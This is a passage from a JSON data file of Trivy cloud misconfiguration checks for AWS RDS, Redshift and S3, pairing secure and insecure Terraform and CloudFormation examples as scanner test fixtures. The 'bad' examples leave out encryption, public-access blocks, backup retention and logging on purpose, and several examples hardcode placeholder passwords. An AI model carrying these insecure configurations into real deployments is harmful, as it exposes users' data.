        "rule_id": "AWS-RDS-SPECIFY_BACKUP_RETENTION",
        "title": "Specify Backup Retention",
        "provider": "aws",
        "service": "rds",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            BackupRetentionPeriod: 30\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties: null\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster#backup_retention_period\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#backup_retention_period\n  good:\n    - |-\n      resource \"aws_rds_cluster\" \"good_example\" {\n        cluster_identifier      = \"aurora-cluster-demo\"\n        engine                  = \"aurora-mysql\"\n        engine_version          = \"5.7.mysql_aurora.2.03.2\"\n        availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n        database_name           = \"mydb\"\n        master_username         = \"foo\"\n        master_password         = \"bar\"\n        backup_retention_period = 5\n        preferred_backup_window = \"07:00-09:00\"\n      }\n    - |-\n      resource \"aws_db_instance\" \"good_example\" {\n        allocated_storage       = 10\n        engine                  = \"mysql\"\n        engine_version          = \"5.7\"\n        instance_class          = \"db.t3.micro\"\n        name                    = \"mydb\"\n        username                = \"foo\"\n        password                = \"foobarbaz\"\n        parameter_group_name    = \"default.mysql5.7\"\n        backup_retention_period = 5\n        skip_final_snapshot     = true\n      }\n  bad:\n    - |-\n      resource \"aws_db_instance\" \"bad_example\" {\n        allocated_storage       = 10\n        engine                  = \"mysql\"\n        engine_version          = \"5.7\"\n        instance_class          = \"db.t3.micro\"\n        name                    = \"mydb\"\n        username                = \"foo\"\n        password                = \"foobarbaz\"\n        parameter_group_name    = \"default.mysql5.7\"\n        backup_retention_period = 1\n        skip_final_snapshot     = true\n      }\n    - |-\n      resource \"aws_db_instance\" \"bad_example\" {\n        allocated_storage    = 10\n        engine               = \"mysql\"\n        engine_version       = \"5.7\"\n        instance_class       = \"db.t3.micro\"\n        name                 = \"mydb\"\n        username             = \"foo\"\n        password             = \"foobarbaz\"\n        parameter_group_name = \"default.mysql5.7\"\n        skip_final_snapshot  = true\n      }\n    - |-\n      resource \"aws_rds_cluster\" \"bad_example\" {\n        cluster_identifier      = \"aurora-cluster-demo\"\n        engine                  = \"aurora-mysql\"\n        engine_version          = \"5.7.mysql_aurora.2.03.2\"\n        availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n        database_name           = \"mydb\"\n        master_username         = \"foo\"\n        master_password         = \"bar\"\n        preferred_backup_window = \"07:00-09:00\"\n      }\n",
        "file_name": "specify_backup_retention.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/specify_backup_retention.yaml",
        "local_path": "aws/rds/specify_backup_retention.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      BackupRetentionPeriod: 30"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties: null"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster#backup_retention_period",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#backup_retention_period"
            ],
            "good": [
              "resource \"aws_rds_cluster\" \"good_example\" {\n  cluster_identifier      = \"aurora-cluster-demo\"\n  engine                  = \"aurora-mysql\"\n  engine_version          = \"5.7.mysql_aurora.2.03.2\"\n  availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n  database_name           = \"mydb\"\n  master_username         = \"foo\"\n  master_password         = \"bar\"\n  backup_retention_period = 5\n  preferred_backup_window = \"07:00-09:00\"\n}",
              "resource \"aws_db_instance\" \"good_example\" {\n  allocated_storage       = 10\n  engine                  = \"mysql\"\n  engine_version          = \"5.7\"\n  instance_class          = \"db.t3.micro\"\n  name                    = \"mydb\"\n  username                = \"foo\"\n  password                = \"foobarbaz\"\n  parameter_group_name    = \"default.mysql5.7\"\n  backup_retention_period = 5\n  skip_final_snapshot     = true\n}"
            ],
            "bad": [
              "resource \"aws_db_instance\" \"bad_example\" {\n  allocated_storage       = 10\n  engine                  = \"mysql\"\n  engine_version          = \"5.7\"\n  instance_class          = \"db.t3.micro\"\n  name                    = \"mydb\"\n  username                = \"foo\"\n  password                = \"foobarbaz\"\n  parameter_group_name    = \"default.mysql5.7\"\n  backup_retention_period = 1\n  skip_final_snapshot     = true\n}",
              "resource \"aws_db_instance\" \"bad_example\" {\n  allocated_storage    = 10\n  engine               = \"mysql\"\n  engine_version       = \"5.7\"\n  instance_class       = \"db.t3.micro\"\n  name                 = \"mydb\"\n  username             = \"foo\"\n  password             = \"foobarbaz\"\n  parameter_group_name = \"default.mysql5.7\"\n  skip_final_snapshot  = true\n}",
              "resource \"aws_rds_cluster\" \"bad_example\" {\n  cluster_identifier      = \"aurora-cluster-demo\"\n  engine                  = \"aurora-mysql\"\n  engine_version          = \"5.7.mysql_aurora.2.03.2\"\n  availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n  database_name           = \"mydb\"\n  master_username         = \"foo\"\n  master_password         = \"bar\"\n  preferred_backup_window = \"07:00-09:00\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-REDSHIFT-ADD_DESCRIPTION_TO_SECURITY_GROUP",
        "title": "Add Description To Security Group",
        "provider": "aws",
        "service": "redshift",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Redshift::ClusterSecurityGroup\n          Properties:\n            Description: Disallow bad stuff\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Redshift::ClusterSecurityGroup\n          Properties:\n            Description: \"\"\n",
        "file_name": "add_description_to_security_group.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/redshift/add_description_to_security_group.yaml",
        "local_path": "aws/redshift/add_description_to_security_group.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Redshift::ClusterSecurityGroup\n    Properties:\n      Description: Disallow bad stuff"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Redshift::ClusterSecurityGroup\n    Properties:\n      Description: \"\""
            ]
          }
        }
      },
      {
        "rule_id": "AWS-REDSHIFT-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "redshift",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            Encrypted: true\n            KmsKeyId: something\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            Encrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#encrypted\n  good:\n    - |-\n      resource \"aws_kms_key\" \"redshift\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_redshift_cluster\" \"good_example\" {\n        cluster_identifier = \"tf-redshift-cluster\"\n        database_name      = \"mydb\"\n        master_username    = \"foo\"\n        master_password    = \"Mustbe8characters\"\n        node_type          = \"dc1.large\"\n        cluster_type       = \"single-node\"\n        encrypted          = true\n        kms_key_id         = aws_kms_key.redshift.key_id\n      }\n  bad:\n    - |-\n      resource \"aws_redshift_cluster\" \"bad_example\" {\n        cluster_identifier = \"tf-redshift-cluster\"\n        database_name      = \"mydb\"\n        master_username    = \"foo\"\n        master_password    = \"Mustbe8characters\"\n        node_type          = \"dc1.large\"\n        cluster_type       = \"single-node\"\n      }\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/redshift/encryption_customer_key.yaml",
        "local_path": "aws/redshift/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      Encrypted: true\n      KmsKeyId: something"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      Encrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#encrypted"
            ],
            "good": [
              "resource \"aws_kms_key\" \"redshift\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_redshift_cluster\" \"good_example\" {\n  cluster_identifier = \"tf-redshift-cluster\"\n  database_name      = \"mydb\"\n  master_username    = \"foo\"\n  master_password    = \"Mustbe8characters\"\n  node_type          = \"dc1.large\"\n  cluster_type       = \"single-node\"\n  encrypted          = true\n  kms_key_id         = aws_kms_key.redshift.key_id\n}"
            ],
            "bad": [
              "resource \"aws_redshift_cluster\" \"bad_example\" {\n  cluster_identifier = \"tf-redshift-cluster\"\n  database_name      = \"mydb\"\n  master_username    = \"foo\"\n  master_password    = \"Mustbe8characters\"\n  node_type          = \"dc1.large\"\n  cluster_type       = \"single-node\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-REDSHIFT-NO_CLASSIC_RESOURCES",
        "title": "No Classic Resources",
        "provider": "aws",
        "service": "redshift",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of redshift sgr\n\n      Resources:\n        myCluster:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            DBName: mydb\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of redshift sgr\n\n      Resources:\n        SecGroup:\n          Type: AWS::Redshift::ClusterSecurityGroup\n          Properties:\n            Description: \"\"\n",
        "file_name": "no_classic_resources.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/redshift/no_classic_resources.yaml",
        "local_path": "aws/redshift/no_classic_resources.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of redshift sgr\n\nResources:\n  myCluster:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      DBName: mydb"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of redshift sgr\n\nResources:\n  SecGroup:\n    Type: AWS::Redshift::ClusterSecurityGroup\n    Properties:\n      Description: \"\""
            ]
          }
        }
      },
      {
        "rule_id": "AWS-REDSHIFT-USE_VPC",
        "title": "Use Vpc",
        "provider": "aws",
        "service": "redshift",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            ClusterSubnetGroupName: my-subnet-group\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            DBName: mydb\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#cluster_subnet_group_name\n  good:\n    - |-\n      resource \"aws_redshift_cluster\" \"good_example\" {\n        cluster_identifier        = \"tf-redshift-cluster\"\n        database_name             = \"mydb\"\n        cluster_subnet_group_name = \"redshift_subnet\"\n      }\n  bad:\n    - |-\n      resource \"aws_redshift_cluster\" \"bad_example\" {\n        cluster_identifier = \"tf-redshift-cluster\"\n        database_name      = \"mydb\"\n      }\n",
        "file_name": "use_vpc.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/redshift/use_vpc.yaml",
        "local_path": "aws/redshift/use_vpc.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      ClusterSubnetGroupName: my-subnet-group"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      DBName: mydb"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#cluster_subnet_group_name"
            ],
            "good": [
              "resource \"aws_redshift_cluster\" \"good_example\" {\n  cluster_identifier        = \"tf-redshift-cluster\"\n  database_name             = \"mydb\"\n  cluster_subnet_group_name = \"redshift_subnet\"\n}"
            ],
            "bad": [
              "resource \"aws_redshift_cluster\" \"bad_example\" {\n  cluster_identifier = \"tf-redshift-cluster\"\n  database_name      = \"mydb\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-BLOCK_PUBLIC_ACLS",
        "title": "Block Public Acls",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            PublicAccessBlockConfiguration:\n              BlockPublicAcls: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_acls\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n        bucket            = aws_s3_bucket.good_example.id\n        block_public_acls = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket = aws_s3_bucket.bad_example.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket            = aws_s3_bucket.bad_example.id\n        block_public_acls = false\n      }\n",
        "file_name": "block_public_acls.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/block_public_acls.yaml",
        "local_path": "aws/s3/block_public_acls.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      PublicAccessBlockConfiguration:\n        BlockPublicAcls: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_acls"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket            = aws_s3_bucket.good_example.id\n  block_public_acls = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.bad_example.id\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket            = aws_s3_bucket.bad_example.id\n  block_public_acls = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-BLOCK_PUBLIC_POLICY",
        "title": "Block Public Policy",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            PublicAccessBlockConfiguration:\n              BlockPublicPolicy: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_policy\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n        bucket              = aws_s3_bucket.example.id\n        block_public_policy = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket = aws_s3_bucket.example.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"mybucket\"\n      }\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket              = aws_s3_bucket.example.id\n        block_public_policy = false\n      }\n",
        "file_name": "block_public_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/block_public_policy.yaml",
        "local_path": "aws/s3/block_public_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      PublicAccessBlockConfiguration:\n        BlockPublicPolicy: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_policy"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket              = aws_s3_bucket.example.id\n  block_public_policy = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id\n}",
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket              = aws_s3_bucket.example.id\n  block_public_policy = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_BUCKET_ENCRYPTION",
        "title": "Enable Bucket Encryption",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketEncryption:\n              ServerSideEncryptionConfiguration:\n                - BucketKeyEnabled: true\n                  ServerSideEncryptionByDefault:\n                    SSEAlgorithm: AES256\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n\n        server_side_encryption_configuration {\n          rule {\n            apply_server_side_encryption_by_default {\n              kms_master_key_id = \"arn\"\n              sse_algorithm     = \"aws:kms\"\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            kms_master_key_id = aws_kms_key.mykey.arn\n            sse_algorithm     = \"aws:kms\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n\n        rule {}\n      }\n",
        "file_name": "enable_bucket_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_bucket_encryption.yaml",
        "local_path": "aws/s3/enable_bucket_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketEncryption:\n        ServerSideEncryptionConfiguration:\n          - BucketKeyEnabled: true\n            ServerSideEncryptionByDefault:\n              SSEAlgorithm: AES256"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        kms_master_key_id = \"arn\"\n        sse_algorithm     = \"aws:kms\"\n      }\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      kms_master_key_id = aws_kms_key.mykey.arn\n      sse_algorithm     = \"aws:kms\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n\n  rule {}\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_LOGGING",
        "title": "Enable Logging",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            LoggingConfiguration:\n              DestinationBucketName: !Ref TestLoggingBucket\n              LogFilePrefix: accesslogs/\n\n        TestLoggingBucket:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: LogDeliveryWrite\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\n          Properties: null\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"this\" {\n        bucket = \"test-bucket\"\n        logging {\n          target_bucket = aws_s3_bucket.log_bucket.id\n          target_prefix = \"log/\"\n        }\n      }\n\n      resource \"aws_s3_bucket\" \"log_bucket\" {\n        bucket = \"test-log-bucket\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"log_bucket\" {\n        acl    = \"log-delivery-write\"\n        bucket = aws_s3_bucket.log_bucket.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"this\" {\n        bucket = \"test-bucket\"\n      }\n\n      resource \"aws_s3_bucket_logging\" \"this\" {\n        bucket        = aws_s3_bucket.this.id\n        target_bucket = aws_s3_bucket.log_bucket.id\n        target_prefix = \"log/\"\n      }\n\n      resource \"aws_s3_bucket\" \"log_bucket\" {\n        bucket = \"test-log-bucket\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"log_bucket\" {\n        acl    = \"log-delivery-write\"\n        bucket = aws_s3_bucket.log_bucket.id\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"this\" {\n        bucket = \"test-bucket\"\n      }\n",
        "file_name": "enable_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_logging.yaml",
        "local_path": "aws/s3/enable_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      LoggingConfiguration:\n        DestinationBucketName: !Ref TestLoggingBucket\n        LogFilePrefix: accesslogs/\n\n  TestLoggingBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: LogDeliveryWrite"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket\n    Properties: null"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"this\" {\n  bucket = \"test-bucket\"\n  logging {\n    target_bucket = aws_s3_bucket.log_bucket.id\n    target_prefix = \"log/\"\n  }\n}\n\nresource \"aws_s3_bucket\" \"log_bucket\" {\n  bucket = \"test-log-bucket\"\n}\n\nresource \"aws_s3_bucket_acl\" \"log_bucket\" {\n  acl    = \"log-delivery-write\"\n  bucket = aws_s3_bucket.log_bucket.id\n}",
              "resource \"aws_s3_bucket\" \"this\" {\n  bucket = \"test-bucket\"\n}\n\nresource \"aws_s3_bucket_logging\" \"this\" {\n  bucket        = aws_s3_bucket.this.id\n  target_bucket = aws_s3_bucket.log_bucket.id\n  target_prefix = \"log/\"\n}\n\nresource \"aws_s3_bucket\" \"log_bucket\" {\n  bucket = \"test-log-bucket\"\n}\n\nresource \"aws_s3_bucket_acl\" \"log_bucket\" {\n  acl    = \"log-delivery-write\"\n  bucket = aws_s3_bucket.log_bucket.id\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"this\" {\n  bucket = \"test-bucket\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_OBJECT_READ_LOGGING",
        "title": "Enable Object Read Logging",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"ReadOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::${aws_s3_bucket.good_example.bucket}/\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"WriteOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::test-bucket/\"] # another bucket\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::my-bucket\"] # missing slash\n          }\n        }\n      }\n",
        "file_name": "enable_object_read_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_object_read_logging.yaml",
        "local_path": "aws/s3/enable_object_read_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"ReadOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::${aws_s3_bucket.good_example.bucket}/\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"WriteOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::test-bucket/\"] # another bucket\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::my-bucket\"] # missing slash\n    }\n  }\n}"
            ]
          }
        }
      },
      {
